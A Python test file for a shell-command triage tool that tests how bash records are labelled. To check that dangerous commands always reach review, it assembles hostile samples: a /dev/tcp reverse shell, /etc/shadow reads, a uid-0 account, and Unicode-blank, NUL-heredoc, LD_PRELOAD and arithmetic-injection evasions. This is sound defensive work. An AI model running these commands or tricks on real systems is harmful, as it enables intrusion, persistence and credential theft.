"""The final review of 7afc8e2: a record is glossed as context, or claimed whole by a multiline rule, only when it is
made of shapes the rules positively understand. Anything unusual goes to the model.

Each bash behavior these rely on was checked in bash 5.2.37 (Debian, in a container with no network, as nobody) and
bash 5.3.15 (Git Bash) with harmless markers. Records go through parse_paths and apply_rules for each reader, as the
reviewer's repros did. Attack-like text is assembled from fragments at runtime, and characters other than printable
ASCII are built with chr(), so this file stays ASCII.
"""

import json

import pytest

from interlinear_cti.glossing import apply_rules
from interlinear_cti.model import Transcript
from interlinear_cti.normalize import (has_unusual_characters, is_plain_heredoc_write, join_logical_lines,
                                      split_command_spans, split_commands)
from interlinear_cti.parse import is_binary, parse_paths
from interlinear_cti.rules import load_library

AT = "2026-10-19T00:00:00Z"
BS = "\\"
NBSP, IDEO, EN_QUAD = chr(0xA0), chr(0x3000), chr(0x2000)
CU, SH, BA = "cu" + "rl", "s" + "h", "ba" + "sh"
SHADOW = "cat /etc/" + "sha" + "dow"
ADD = "user" + "add -o -u 0 svc"
REV = BA + " -i >& /dev/" + "tcp/203.0.113.5/4444 0>&1"
READERS = ("agent.jsonl", ".bash_history", ".zsh_history", "x.sh")


@pytest.fixture(scope="module")
def library():
    return load_library()


def stored(tmp_path, kind, text):
    """The parse output for text read as kind: an agent tool call, a history entry or a script."""
    if kind == "agent.jsonl":
        raw = json.dumps({"role": "tool_call", "tool": "terminal", "input": text}) + "\n"
    elif kind == ".zsh_history":
        raw = ": 1760000000:0;" + text.replace("\n", BS + "\n") + "\n"
    else:
        raw = text + "\n"
    path = tmp_path / kind
    path.write_bytes(raw.encode("utf-8"))
    data = parse_paths([path], now=AT)
    path.unlink()
    return data


def texts(tmp_path, kind, text):
    return [line["text"] for line in stored(tmp_path, kind, text)["lines"] if line["actor"] != "tool_output"]


def glosses(tmp_path, library, kind, text):
    """The gloss of each record text becomes: a rule id, "context:<id>" for a context rule, or "pending"."""
    transcript = Transcript.model_validate(stored(tmp_path, kind, text))
    apply_rules(transcript, library, at=AT)
    out = []
    for line in transcript.lines:
        if line.actor == "tool_output":
            continue
        if line.gloss.source == "none":
            out.append("context:" + line.gloss.rule_id)
        else:
            out.append(line.gloss.rule_id if line.gloss.source == "rule" else line.gloss.source)
    return out


# 1. Blanks. bash reads only space and tab as blanks: a no-break space, an ideographic space or an en quad is part of a
# word, so a # after one starts no comment and the pipeline after it runs. The joiner and the splitter strip space and
# tab only, so a stored record keeps every other blank where bash sees it.


@pytest.mark.parametrize("lines, expected", [
    ([NBSP + "#| " + SHADOW], [(1, NBSP + "#| " + SHADOW)]),
    (["cd /tmp", NBSP + "#| " + SHADOW], [(1, "cd /tmp"), (2, NBSP + "#| " + SHADOW)]),
    (["echo a " + BS, NBSP + "#| " + SHADOW], [(1, "echo a " + NBSP + "#| " + SHADOW)]),
    (["echo a &&", NBSP + "#| " + SHADOW], [(1, "echo a && " + NBSP + "#| " + SHADOW)]),
    ([IDEO + "# x | " + SHADOW], [(1, IDEO + "# x | " + SHADOW)]),
    ([NBSP], [(1, NBSP)]),  # bash runs a command whose name is a no-break space
    (["  ls  ", "\tpwd\t"], [(1, "ls"), (2, "pwd")]),  # spaces and tabs still go
])
def test_records_are_stripped_of_space_and_tab_only(lines, expected):
    assert join_logical_lines(lines) == expected


@pytest.mark.parametrize("text, expected", [
    ("ls;" + NBSP + "#| " + SHADOW, [(0, "ls"), (3, NBSP + "#| " + SHADOW)]),
    ("ls; " + IDEO + "x ", [(0, "ls"), (4, IDEO + "x")]),
    ("echo a &&\n" + NBSP + "#| " + SHADOW, [(0, "echo a"), (10, NBSP + "#| " + SHADOW)]),
    ("a ; b", [(0, "a"), (4, "b")]),
])
def test_split_parts_keep_other_blanks(text, expected):
    assert split_command_spans(text) == expected
    assert split_commands(text) == [part for _, part in expected]


@pytest.mark.parametrize("kind", READERS)
@pytest.mark.parametrize("text, expected", [
    (NBSP + "#| " + SHADOW, [NBSP + "#| " + SHADOW]),
    ("ls;" + NBSP + "#| " + SHADOW, ["ls", NBSP + "#| " + SHADOW]),
    ("cd /tmp\n" + NBSP + "#| " + SHADOW, ["cd /tmp", NBSP + "#| " + SHADOW]),
    ("echo a &&\n" + NBSP + "#| " + SHADOW, ["echo a", NBSP + "#| " + SHADOW]),
])
def test_every_reader_stores_other_blanks(tmp_path, kind, text, expected):
    assert texts(tmp_path, kind, text) == expected


def test_a_continuation_keeps_the_blank_after_it(tmp_path):
    for kind in (".bash_history", "x.sh"):
        assert texts(tmp_path, kind, "echo a " + BS + "\n" + NBSP + "#| " + SHADOW) == [
            "echo a " + NBSP + "#| " + SHADOW]


# 2. Unusual characters. A record that holds a blank other than space and tab, or a control character other than tab
# and newline (stored as a control picture, U+2400 to U+241F, or as a code point in angle brackets), reads differently
# to bash than it looks: bash drops a NUL, so EO<NUL>F ends a heredoc at EOF, and a no-break space is part of a word.
# Such a record is never context and never claimed whole by a multiline rule; it goes to the model, with a warning.
NUL, VT, FF, CR, PICTURE_NUL = chr(0), chr(0x0B), chr(0x0C), chr(0x0D), chr(0x2400)
UNUSUAL_LINES = {
    "nbsp before # in a pipeline": "echo x" + NBSP + "#|" + SHADOW,
    "nbsp before # then a reverse shell": "ls" + NBSP + "#| " + REV,
    "nbsp before # then an account": "cd /tmp" + NBSP + "# | " + ADD,
    "nbsp before # and &&": "true" + NBSP + "#&& " + ADD,
    "ideographic space before #": "echo x" + IDEO + "#|" + SHADOW,
    "en quad before #": "echo x" + EN_QUAD + "#|" + SHADOW,
    "leading nbsp then #": NBSP + "#| " + SHADOW,
    "leading ideographic space then #": IDEO + "# x | " + SHADOW,
    "vertical tab before #": "echo x" + VT + "#| " + SHADOW,
    "form feed before #": "echo x" + FF + "#| " + SHADOW,
    "carriage return before #": "echo x" + CR + "#| " + SHADOW,
    "a typed control picture": "echo a" + PICTURE_NUL + "b",
    "a line separator": "echo a" + chr(0x2028) + "b",
    "a narrow no-break space": "cd" + chr(0x202F) + "/tmp",
}


@pytest.mark.parametrize("kind", READERS)
@pytest.mark.parametrize("name", list(UNUSUAL_LINES))
def test_a_record_with_an_unusual_character_is_never_context(tmp_path, library, kind, name):
    out = glosses(tmp_path, library, kind, UNUSUAL_LINES[name])
    assert not any(gloss.startswith("context:") for gloss in out), out


@pytest.mark.parametrize("kind", READERS)
@pytest.mark.parametrize("text, expected", [
    ("echo hi", ["context:print"]), ("ls -la", ["context:navigation"]), ("cd /tmp", ["context:navigation"]),
    ("cat notes.txt", ["pending"]), ("echo" + "\t" + "hi", ["context:print"]),
    ("echo caf" + chr(0xE9) + " " + chr(0x4F60), ["pending"]),  # not unusual, but not plainly literal ASCII either
    ("echo x # note", ["context:print"]),
])
def test_ordinary_lines_keep_their_context(tmp_path, library, kind, text, expected):
    assert glosses(tmp_path, library, kind, text) == expected


def test_an_unusual_character_is_reported(tmp_path):
    data = stored(tmp_path, "x.sh", "echo hi\nls" + NBSP + "#| " + SHADOW + "\necho a" + VT + "b")
    assert [w for w in data["warnings"] if "left to the model" in w] == [
        "x.sh: line 2: a blank other than space or tab, or a control character; left to the model",
        "x.sh: line 3: a blank other than space or tab, or a control character; left to the model"]
    assert stored(tmp_path, ".bash_history", "echo hi")["warnings"] == []


def test_prose_with_a_no_break_space_is_not_reported(tmp_path):
    path = tmp_path / "agent.jsonl"
    rows = [{"role": "assistant", "content": "Voici le plan" + NBSP + ": lister"},
            {"role": "user", "content": "Merci" + NBSP + "!"}]
    path.write_text("".join(json.dumps(row) + "\n" for row in rows), encoding="utf-8")
    assert parse_paths([path], now=AT)["warnings"] == []


# The reviewer's NUL records, in a script past the parse stage's 8 KiB binary sniff: bash ends the heredoc at the line
# that holds the NUL and runs the lines after it, so the record that the joiner reads whole goes to the model.
PAD = ("#" * 70 + "\n") * 120


@pytest.mark.parametrize("text", [
    PAD + "cat >> ~/.bashrc <<EOF\nalias ll=ls\nEO" + NUL + "F\n" + ADD + "\n" + SHADOW + "\nEOF",
    PAD + "cat > /etc/cron.d/x <<E" + NUL + "OF\n* * * * * root true\nEOF\n" + ADD + "\nE" + NUL + "OF",
])
def test_a_nul_in_a_heredoc_sends_the_record_to_the_model(tmp_path, library, text):
    out = glosses(tmp_path, library, "x.sh", text)
    assert out == ["pending"] * 121  # a file with a NUL gets no context label at all


def test_a_record_with_a_nul_goes_to_the_model(tmp_path, library):
    assert glosses(tmp_path, library, "x.sh", PAD + "echo a" + NUL + "b\nls") == ["pending"] * 122


@pytest.mark.parametrize("text", [
    "cat >> ~/.bashrc <<EOF\nalias ll=ls\nEO" + PICTURE_NUL + "F",
    "cat >> ~/.bashrc <<E" + PICTURE_NUL + "OF\nalias ll=ls\nE" + PICTURE_NUL + "OF",
    "cat >> ~/.bashrc <<E" + NUL + "OF\nalias ll=ls\nE" + NUL + "OF",
    "cat >> ~/.bashrc <<'EOF'\nalias ll=ls" + NBSP + "\nEOF",
    "cat >> ~/.bashrc <<'EOF'\nalias ll=ls\nEOF" + CR,
])
def test_an_unusual_heredoc_is_not_a_plain_write(text):
    assert not is_plain_heredoc_write(text)
    assert is_plain_heredoc_write("cat >> ~/.bashrc <<'EOF'\nalias ll=ls\nEOF")


@pytest.mark.parametrize("text, unusual", [
    ("echo hi", False), ("echo\thi\nls", False), ("caf" + chr(0xE9) + chr(0x4F60) + chr(0x1F600), False),
    (NBSP, True), (IDEO, True), (EN_QUAD, True), (chr(0x200A), True), (chr(0x205F), True), (chr(0x1680), True),
    (NUL, True), (VT, True), (FF, True), (CR, True), (chr(0x1F), True), (chr(0x7F), True), (chr(0x85), True),
    (chr(0x9B), True), (PICTURE_NUL, True), (chr(0x240D), True), (chr(0x2421), True), (chr(0x27E8), True),
    (chr(0x200B), True), (chr(0xFEFF), True), (chr(0x202E), True), (chr(0xE0041), True), (chr(0x2028), True),
])
def test_which_characters_are_unusual(text, unusual):
    assert has_unusual_characters("echo " + text + " x") is unusual


# 3. The context grammar itself reads blanks and letters as bash does, also when called on raw text: only space and
# tab are blanks, and its option letters and names are case-sensitive even inside a rule written with (?i), such as
# navigation. With (?i), declare -n, declare -i and export -f passed as flags after a cd.
def context_rules(library):
    return [rule for rule in library.rules if rule.context]


@pytest.mark.parametrize("text", [
    "echo x" + NBSP + "#|" + SHADOW, "ls" + NBSP + "#| " + REV, NBSP + "#| " + SHADOW, "true" + NBSP + "#",
    "cd /tmp" + NBSP + "# | " + ADD, "echo x" + IDEO + "#|" + SHADOW, "echo x" + EN_QUAD + "#| " + SHADOW,
    "echo x" + VT + "#| " + SHADOW, "echo x" + FF + "#| " + SHADOW, "echo x" + CR + "#| " + SHADOW,
    "x=1" + NBSP + "#| " + SHADOW, "if true" + NBSP + "#; then", "{" + NBSP + "true; }",
])
def test_the_context_grammar_reads_only_space_and_tab_as_blanks(library, text):
    assert [rule.id for rule in context_rules(library) if rule.regex.search(text)] == []


@pytest.mark.parametrize("text", [
    "cd /tmp; declare -n r=HISTFILE", "cd /tmp; local -n r=PATH", "cd /tmp; declare -i n", "cd /tmp; export -f f",
    "cd /tmp; readonly -f f", "ls; declare -n r=PROMPT_COMMAND; r=/tmp/.x/run",
])
def test_the_context_grammar_is_case_sensitive(library, text):
    assert [rule.id for rule in context_rules(library) if rule.regex.search(text)] == []


@pytest.mark.parametrize("text, rule_id", [
    ("CD /tmp", "navigation"), ("DIR", "navigation"), ("Cls", "navigation"), ("cd /tmp; declare -A m", "navigation"),
    ("cd /tmp; local -r x=1", "navigation"), ("ls; set -e", "navigation"), ("echo a b\tc", "print"),
    ("a=(1 2\n3)", "assignment"),
])
def test_command_names_stay_case_insensitive_where_they_were(library, text, rule_id):
    assert context_of(library, text) == rule_id


# A run of whitespace that one part of a scan reads as a blank and another as part of a word is quadratic: the {cmd}
# lookahead in front of navigation once took 0.9 s on 4,200 no-break spaces. The guard times such runs on every rule.
def test_the_guard_times_runs_of_other_whitespace():
    from interlinear_cti.rules import SHAPES
    assert {NBSP, IDEO, VT} <= set(SHAPES)


@pytest.mark.parametrize("unit", [NBSP, NBSP + "a", IDEO, "a" + NBSP + ") ", NBSP + "#"])
def test_runs_of_other_whitespace_cost_linear_time(library, unit):
    import time

    def best(fn, text):
        out = float("inf")
        for _ in range(3):
            start = time.perf_counter()
            fn(text)
            out = min(out, time.perf_counter() - start)
        return out

    small, large = ((unit * (n // len(unit) + 1))[:n] for n in (1050, 4200))
    for rule in library.rules:
        for _ in range(2):  # a loaded machine can spoil one look; a real growth survives the second
            t_small, t_large = best(rule.regex.search, small), best(rule.regex.search, large)
            if t_large < 0.002 or t_large <= 8 * t_small:
                break
        assert t_large < 0.002 or t_large <= 8 * t_small, (rule.id, t_small, t_large)


# 4. Expansions in [ and test. Both split their arguments into words after expansion and read the operators from the
# result, so an expansion can become an operator: after x=a\[\$\(id\)\] (which stores a[$(id)]), with op=-v,
# [ $op 'b[x]' ] evaluates the subscript of b[x] and runs id. A word with any expansion (a $, an ANSI-C or locale
# string, an unquoted glob, brace or tilde) is context only as one double-quoted word that cannot become several,
# right after a literal unary operator other than -v, next to a literal binary operator, or as the only word.
SUBST = "a" + BS + "[" + BS + "$" + BS + "(id" + BS + ")" + BS + "]"


def context_of(library, text):
    """The context rule the grammar reads text as, before the gates that keep context to plainly literal records
    (rules.plainly_literal, Library.match): these tests pin the grammar, which still reads every literal record."""
    rule = next((rule for rule in library.rules if rule.regex.search(text)), None)
    return rule.id if rule is not None and rule.context else None


@pytest.mark.parametrize("text", [
    "[ $op 'b[x]' ]", "[ $v ]", "if [ $v ]; then", "[ -f $p ]", "test -n $p", "test $v", "[ ${v} ]",
    "test $'-v' 'b[x]'", "[ $\"-v\" 'b[x]' ]", "[ $'" + BS + "x2dv' 'b[x]' ]", "[[ $'-v' 'b[x]' ]]",
    '[ "$op" "$n" ]', '[ ! "$op" "$n" ]', '[ -n x -a "$op" "$n" ]', "[ z -a \"$y\" 'b[x]' ]",
    "[ \"$y\" 'b[x]' = q ]", "[ ! \"$y\" 'b[x]' ]", '[ "$x"y = z ]', '[ "$@" ]', '[ -n "${a[@]}" ]',
    "[ ?v 'b[x]' ]", "[ [-]v 'b[x]' ]", "[ -f * ]", "[ {-v,'b[x]'} ]", "[ ~- 'b[x]' ]", "test ~+ x", "test *",
    "while [ $i -lt 3 ]; do",
])
def test_an_expansion_in_test_is_context_only_where_it_cannot_become_an_operator(library, text):
    assert context_of(library, text) is None


@pytest.mark.parametrize("text", [
    '[ -n "$x" ]', '[ -z "$1" ]', 'if [ -f "$file" ]; then', '[ "$a" = "$b" ]', '[ "$x" -eq 0 ]', 'test "$a" != b',
    "[ -d /tmp ]", "[ ! -f /etc/x ]", '[ "$x" ]', 'test "$x"', '[ -n "$x" -a -f "$y" ]', 'while [ "$i" -lt 10 ]; do',
    "[ x = y ]", "[ -v a ]", '[ "$#" -gt 0 ]', '[ "$1" = "-h" ]', '[ "${x}" = done ]', '[ -n "$x" ] && echo yes',
    '[[ -n $x && $y == z ]]', 'test -f "$f" 2>/dev/null', "[ " + BS + "( -f x " + BS + ") ]",
])
def test_ordinary_tests_stay_context(library, text):
    assert context_of(library, text) == "shell-syntax"


def test_the_reviewers_test_records_reach_the_model(tmp_path, library):
    for history in ("x=" + SUBST + "\nop=-v\n[ $op 'b[x]' ]",
                    "x=" + SUBST + "\nv=-v" + BS + " b" + BS + "[x" + BS + "]\n[ $v ]",
                    "x=" + SUBST + "\nop=-v\nn=b" + BS + "[x" + BS + "]\n[ \"$op\" \"$n\" ]"):
        out = glosses(tmp_path, library, ".bash_history", history)
        assert out[0] == out[-1] == "pending", out  # x=a\[... is not literal


# 5. Options. A command the grammar accepts with options is context only with options it knows and whose arguments
# it reads. sudo: -C -D -g -h -p -R -r -T -t -U -u take the next word, so in sudo -p ls bash, ls is the prompt and bash
# runs. set -k (keyword) puts every NAME=value argument of each later command into its environment, so after it
# ls LD_PRELOAD=/tmp/x.so loads the library. declare and its kin may set no nameref, integer or function.
@pytest.mark.parametrize("text", [
    "sudo -p ls " + BA, "sudo -u echo " + BA + " -i", "sudo -D cd " + SH, "sudo -g ls " + SH, "sudo -r cd " + BA,
    "sudo -t ls " + BA, "sudo -p pwd /tmp/.x/run", "sudo -h ls " + BA, "sudo -C 3 ls", "sudo -R / ls", "sudo -U x ls",
    "sudo -Tp 5 ls", "sudo -e ls", "sudo -s ls", "sudo -i ls", "sudo -A ls", "sudo -Ep x ls",
    "cd /tmp; sudo -p ls " + BA, "sudo -E -p ls " + BA,
    "set -k", "set -ko pipefail", "set -euk", "set -o keyword", "set -o nosuchoption", "set -X", "set -ek",
    "cd /tmp; set -k", "set -e; set -o keyword", "set -o pipefail -o keyword",
    "declare -N x", "local -I n", "export -n X", "readonly -x -f f", "typeset -Ai x",
])
def test_an_option_the_grammar_does_not_model_is_not_context(library, text):
    assert context_of(library, text) is None


@pytest.mark.parametrize("text, rule_id", [
    ("sudo ls -la /root", "navigation"), ("sudo -E ls", "navigation"), ("sudo -n true", "shell-syntax"),
    ("sudo -H -n ls", "navigation"), ("sudo -kn ls", "navigation"), ("set -e", "shell-syntax"),
    ("set -euo pipefail", "shell-syntax"), ("set -x", "shell-syntax"), ("set -o errexit", "shell-syntax"),
    ("set -e -o pipefail", "shell-syntax"), ("set --", "shell-syntax"), ("set -o vi", "shell-syntax"),
    ("set -o noclobber -u", "shell-syntax"), ("declare -A seen", "assignment"), ("local -r x=1", "assignment"),
    ("export -p", "assignment"), ("declare -a arr=(1 2)", "assignment"), ("readonly MAX=5", "assignment"),
    ("declare -gx LANG=C", "assignment"),
])
def test_known_options_stay_context(library, text, rule_id):
    assert context_of(library, text) == rule_id


# 6. printf -v assigns, and printf reads its options from its first argument once redirections are set aside, after
# expansion: -v may follow a redirection (printf >/dev/null -vHISTFILE x), be glued to its name (-vNAME), or come
# from a glob ([-]vX and ?vX match a file named -vX, * the first file), a brace or a tilde (with OLDPWD=-vX, ~- is -vX).
@pytest.mark.parametrize("text", [
    "printf >/dev/null -vHISTFILE /dev/null", "printf 2>&1 -vPROMPT_COMMAND /tmp/.x/run", "printf >&2 -vPS4 x",
    "printf [-]vHISTFILE /dev/null", "printf ?vHISTFILE /dev/null", "printf *", "printf *v* x", "printf ~- /dev/null",
    "printf ~+", "printf {a,-vX} y", "printf x -vY", "printf %s -vY", "printf '%s' '-vY'", "printf </dev/null -vX y",
    "printf >/dev/null 2>&1 -vX y", "printf -- -vX", 'printf "$fmt" y', "printf ${o} y",
])
def test_printf_that_may_assign_is_never_context(library, text):
    assert context_of(library, text) is None


@pytest.mark.parametrize("text", [
    "printf '%s\\n' \"$x\"", 'printf "%s %s\\n" "$a" "$b"', "printf 'done\\n'", "printf x", "printf '%s\\n' *.txt",
    "printf '%-20s %s\\n' \"$a\" \"$b\" >&2", "printf 'a b {,-vX}' y", "printf '%s' ~/x", "printf 'x' >/dev/null",
    "printf >&2 'error: %s\\n' \"$1\"", 'printf "Hello $name\\n"',
])
def test_plain_printf_stays_context(library, text):
    assert context_of(library, text) == "print"


# 7. read -u reads from the descriptor it names, which above 2 may be a socket or a file a script opened. The option
# itself now reads -u and its descriptor, glued or as the next word, instead of a lookahead that rescanned the rest of
# the line from every read (quadratic on )read )read ...) and stopped at a ; inside quotes.
@pytest.mark.parametrize("text", [
    'read -p "a;b" -u 3 x', "read -p 'a|b' -u3 x", "read -u 3 line", "read -u3 line", "read -ru 4 x", "read -u 10 x",
    "read -u -1 x", "read -u $fd x", "read -X x", "read -R x", "read -k x", "read -t 1 -u 5 x",
])
def test_read_from_a_high_descriptor_or_with_an_unknown_option_is_not_context(library, text):
    assert context_of(library, text) is None


@pytest.mark.parametrize("text", [
    "read -u 0 line", "read -u0 line", "read -ru 2 x", "read -r line", 'read -p "a;b" x', "read -rsp 'Name: ' name",
    "read -t 5 -n 1 reply", "read -d '' -r -a parts", "read -e -i default x", "read -N 3 x", "read", "read -E x",
    "read -r a b c 2>/dev/null",
])
def test_ordinary_reads_stay_context(library, text):
    assert context_of(library, text) == "shell-syntax"


def test_the_guard_times_read_after_a_parenthesis():
    from interlinear_cti.rules import SHAPES
    assert {")read ", "read )"} <= set(SHAPES)


@pytest.mark.parametrize("unit", [")read ", "read )", ")read -u 0 ", "read -p x ", "(read ", ")read -p 'a;b' "])
def test_reads_cost_linear_time(library, unit):
    import time

    def best(fn, text):
        out = float("inf")
        for _ in range(3):
            start = time.perf_counter()
            fn(text)
            out = min(out, time.perf_counter() - start)
        return out

    small, large = ((unit * (n // len(unit) + 1))[:n] for n in (1050, 4200))
    for rule in context_rules(library):
        for _ in range(2):  # a loaded machine can spoil one look; a real growth survives the second
            t_small, t_large = best(rule.regex.search, small), best(rule.regex.search, large)
            if t_large < 0.002 or t_large <= 6 * t_small:
                break
        assert t_large < 0.002 or t_large <= 6 * t_small, (rule.id, t_small, t_large)


# 8. Names. bash evaluates every assignment to an integer variable (RANDOM, SRANDOM, OPTIND) as arithmetic, so
# RANDOM=a\[\$\(id\)\] runs id. Other names hold code or name what is loaded or run: MAILPATH's messages expand in an
# interactive bash, OPENSSL_CONF can load a module, VIMINIT is editor commands, ZDOTDIR and HOME pick the startup files
# shells and tools read, BASH_LOADABLES_PATH, FPATH and TEXTDOMAINDIR are paths bash loads from, MANPAGER and SHELL
# name programs that run, BASH_XTRACEFD picks the descriptor xtrace writes to.
@pytest.mark.parametrize("text", [
    "RANDOM=" + SUBST, "SRANDOM=" + SUBST, "OPTIND=" + SUBST, "export RANDOM=" + SUBST, "local OPTIND=" + SUBST,
    "read -r RANDOM", "for OPTIND in " + SUBST + "; do", "RANDOM=42", "OPTIND=1", "local OPTIND", "RANDOM=1 ls",
    "MAILPATH=/tmp/m", "export MAILPATH=/tmp/m", "MAIL=/tmp/m", "OPENSSL_CONF=/tmp/.x/o.cnf", "VIMINIT=:" + BS + "!id",
    "EXINIT=x", "ZDOTDIR=/tmp/.x", "BASH_LOADABLES_PATH=/tmp/.x", "TEXTDOMAINDIR=/tmp/.x", "TEXTDOMAIN=x",
    "FPATH=/tmp/.x", "MANPAGER=/tmp/.x/p", "SYSTEMD_PAGER=x", "SUDO_EDITOR=x", "SHELL=/tmp/.x/s", "BASH_XTRACEFD=3",
    "HOME=/tmp/.x", "export HOME=/tmp/.x", "XDG_CONFIG_HOME=/tmp/.x", "LUA_INIT=x", "LESSCLOSE=x", "BROWSER=x",
    "path=(/tmp/.x)", "fpath=(/tmp/.x)", "module_path=/tmp/.x", "mailpath=/tmp/m", "declare -x SHELL=/bin/sh",
    "for SHELL in a; do", "read HOME", "read -a path", "JDK_JAVA_OPTIONS=x", "_JAVA_OPTIONS=x",
])
def test_names_that_run_or_load_code_are_not_context(library, text):
    assert context_of(library, text) is None


@pytest.mark.parametrize("text, rule_id", [
    ("x=1", "assignment"), ("count=0", "assignment"), ("export LANG=C", "assignment"), ("local i=0", "assignment"),
    ("MAILCHECK=0", "assignment"), ("COLUMNS=80", "assignment"), ("Path=/x", "assignment"), ("homedir=/x", "assignment"),
    ('read -s -p "Password: " password', "shell-syntax"), ('read -rsp "Passphrase: " PASSPHRASE', "shell-syntax"),
    ('read -rp "Key: " key', "shell-syntax"), ("for key in id_rsa id_ed25519; do", "shell-syntax"),
    ("for token in a b c; do", "shell-syntax"), ('for key in "${!map[@]}"; do', "shell-syntax"),
])
def test_ordinary_names_and_read_secrets_stay_context(library, text, rule_id):
    assert context_of(library, text) == rule_id


@pytest.mark.parametrize("text", ["export TOKEN=x", "API_KEY=x", "read AWS_SECRET_ACCESS_KEY", "for GH_TOKEN in a; do"])
def test_credentials_in_assignments_and_provider_names_still_go_to_the_model(library, text):
    assert context_of(library, text) is None


@pytest.mark.parametrize("prefix, unit, suffix", [
    ("export ", "JAVA", ""), ("declare ", "JAVA_", ""), ("local ", "PAGER", ""), ("read ", "EDITOR", ""),
    ("for ", "JAVA_OPTIONS", " in a"), ("", "JAVA_", "=1"), ("export ", "KEY", ""), ("", "A_", "=1"),
])
def test_long_names_cost_linear_time(library, prefix, unit, suffix):
    import time

    def best(fn, text):
        out = float("inf")
        for _ in range(3):
            start = time.perf_counter()
            fn(text)
            out = min(out, time.perf_counter() - start)
        return out

    small, large = (prefix + (unit * (n // len(unit) + 1))[:n] + suffix for n in (1050, 4200))
    for rule in context_rules(library):
        for _ in range(2):
            t_small, t_large = best(rule.regex.search, small), best(rule.regex.search, large)
            if t_large < 0.002 or t_large <= 6 * t_small:
                break
        assert t_large < 0.002 or t_large <= 6 * t_small, (rule.id, t_small, t_large)


# 9. Plain heredoc writes. A leading assignment, or one behind env or sudo, changes which copier runs (PATH=/tmp/.x cat)
# or loads code into it (LD_PRELOAD=...), and an unquoted body expands every variable it names, so a value set earlier
# can run: after x=\$\(id\), a body line ${x@P} runs id, and after x=a\[\$\(id\)\] so do $[x], ${y:x} and ${b[x]}.
# Such records go to the model; a quoted delimiter keeps the body literal.
@pytest.mark.parametrize("text", [
    "PATH=/tmp/.x cat > /etc/cron.d/x <<EOF\n* * * * * root true\nEOF",
    "env PATH=/tmp/.x cat >> ~/.ssh/authorized_keys <<EOF\nssh-ed25519 AAAAC3Nza k\nEOF",
    "LD_PRELOAD=/tmp/.x/l.so tee -a ~/.bashrc <<EOF\nalias ll=ls\nEOF",
    "x=1 tee -a ~/.bashrc <<'EOF'\nalias ll=ls\nEOF", "sudo PATH=/tmp tee -a ~/.bashrc <<'EOF'\nalias ll=ls\nEOF",
    "sudo -u root env A=1 tee -a ~/.bashrc <<'EOF'\nx\nEOF", "X=1 nohup command cat - <<'EOF' >> /tmp/x\nx\nEOF",
    "cat >> ~/.bashrc <<EOF\n${x@P}\nEOF", "cat >> ~/.bashrc <<EOF\n$[x]\nEOF", "tee -a /etc/cron.d/x <<EOF\n${y:x}\nEOF",
    "cat > /etc/sudoers.d/x <<EOF\n${b[x]}\nEOF", "cat >> ~/.bashrc <<EOF\nexport PATH=$PATH:/opt/bin\nEOF",
    "cat >> ~/.bashrc <<EOF\n$HOME\nEOF", "cat >> ~/.bashrc <<EOF\n" + BS + BS + "${x@P}\nEOF",
    "cat >> ~/.bashrc <<EOF\na $1 b\nEOF", "cat >> ~/.bashrc <<EOF\n$$\nEOF", "cat >> ~/.bashrc <<-EOF\n\t$x\n\tEOF",
])
def test_a_write_with_an_assignment_or_an_expanded_variable_is_not_plain(text):
    assert not is_plain_heredoc_write(text)


@pytest.mark.parametrize("text", [
    "cat >> ~/.bashrc <<'EOF'\nexport PATH=$PATH:/opt/bin\n${x@P}\nEOF",
    "cat >> ~/.bashrc <<EOF\nalias ll='ls -la'\nEOF", "cat >> ~/.bashrc <<EOF\nprice " + BS + "$5\nEOF",
    "sudo tee -a /etc/hosts <<EOF\n10.0.0.5 web\nEOF", "env -i tee -a ~/.bashrc <<EOF\nx\nEOF",
    "sudo -u root tee -a ~/.bashrc <<'EOF'\nx\nEOF", "cat > /etc/cron.d/x <<-'EOF'\n\t* * * * * root true\n\tEOF",
    "cat <<EOF >> ${HOME}/.bashrc\nalias ll=ls\nEOF",
])
def test_plain_writes_stay_plain(text):
    assert is_plain_heredoc_write(text)


@pytest.mark.parametrize("kind", READERS)
@pytest.mark.parametrize("text, expected", [
    ("PATH=/tmp/.x cat > /etc/cron.d/x <<EOF\n* * * * * root true\nEOF", ["pending"]),
    ("env PATH=/tmp/.x cat >> ~/.ssh/authorized_keys <<EOF\nssh-ed25519 AAAAC3Nza k\nEOF", ["pending"]),
    ("x=" + BS + "$" + BS + "(id" + BS + ")\ncat >> ~/.bashrc <<EOF\n${x@P}\nEOF", ["pending", "pending"]),
    ("cat > /etc/cron.d/x <<'EOF'\n* * * * * root true\nEOF", ["cron"]),
])
def test_the_reviewers_heredoc_records(tmp_path, library, kind, text, expected):
    assert glosses(tmp_path, library, kind, text) == expected


# 10. su with a command or a shell runs that command or shell: -c, --command, --session-command, -s, --shell, and any
# word after the user, which su hands to the shell, so switch-user claims only su with login flags and a user, and the
# rest goes to the model. sudo with a bare shell and nothing after it opens that shell.
@pytest.mark.parametrize("text, rule_id", [
    ("su root -c id", None), ("su - -c id", None), ("sudo su -c 'whoami'", None), ("su -c id", None),
    ("su -s /tmp/.x/sh root", None), ("su root --command=id", None), ("su --session-command=id", None),
    ("su - postgres -c 'psql -l'", None), ("su -lc id", None), ("su --shell /bin/sh x", None),
    ("su root /tmp/.x/run", None), ("sudo su - postgres -c 'psql -l'", None), ("sudo su root -c id", None),
    ("su -", "switch-user"), ("su", "switch-user"), ("su - root", "switch-user"), ("su -l postgres", "switch-user"),
    ("su john", "switch-user"), ("su - www-data", "switch-user"), ("su --login deploy", "switch-user"),
    ("su -m root", "switch-user"), ("su - root; id", "switch-user"),
    ("sudo " + BA, "sudo-shell"), ("sudo -u john " + BA, "sudo-shell"), ("sudo -E " + SH, "sudo-shell"),
    ("sudo /bin/" + BA, "sudo-shell"), ("sudo -u postgres zsh", "sudo-shell"), ("sudo dash", "sudo-shell"),
    ("sudo /usr/bin/" + BA, "sudo-shell"), ("sudo su", "sudo-shell"), ("sudo -i", "sudo-shell"),
    ("sudo " + BA + " -c id", None), ("sudo " + BA + " x.sh", None), ("sudo " + BA + " < x.sh", None),
    ("sudo -u john " + BA + " -i", None),
])
def test_su_and_sudo_shells(library, text, rule_id):
    rule = library.match(text)
    assert (rule.id if rule else None) == rule_id


# 11. A VAR=value prefix that names a loader or code variable changes what the command loads or runs
# (LD_PRELOAD=/tmp/x.so whoami, PATH=/tmp/.x id, HOME=/tmp/.x ssh host), so a rule that names the command would
# describe it and hide the prefix. The command position no longer steps over such a prefix: the line goes to the model,
# unless a rule that reads the whole line, such as a /dev/tcp shell, still matches.
@pytest.mark.parametrize("text", [
